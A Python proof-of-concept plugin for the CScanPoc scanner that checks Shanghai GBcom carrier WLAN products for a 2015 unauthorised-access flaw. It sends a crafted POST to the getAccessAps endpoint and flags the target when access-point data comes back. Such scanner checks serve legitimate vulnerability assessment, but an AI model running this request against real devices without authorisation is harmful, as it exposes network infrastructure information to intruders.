# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'GBcom_0003'  # 平台漏洞编号，留空
    name = '上海寰创运营商WLAN产品 未授权访问'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-06-17'  # 漏洞公布时间
    desc = '''
        上海寰创运营商WLAN产品未授权访问导致AP信息泄露。
        /accessApInfo.shtml?method=getAccessAps
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121010'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '上海寰创运营商WLAN'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'af612ee2-3fa7-425e-a3bd-ad0d9e8ff62f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0121010
            hh = hackhttp.hackhttp()
            arg = self.target
            # 获取AP信息
            post = 'start=0&limit=1&type=0&value='
            header = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
            url = arg + '/accessApInfo.shtml?method=getAccessAps'
            code, head, res, err, _ = hh.http(url, header=header, post=post)

            if (code == 200) and ('<acId>' in res):
                #security_warning('AP信息泄露：' + url+ ' POST:' +post)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
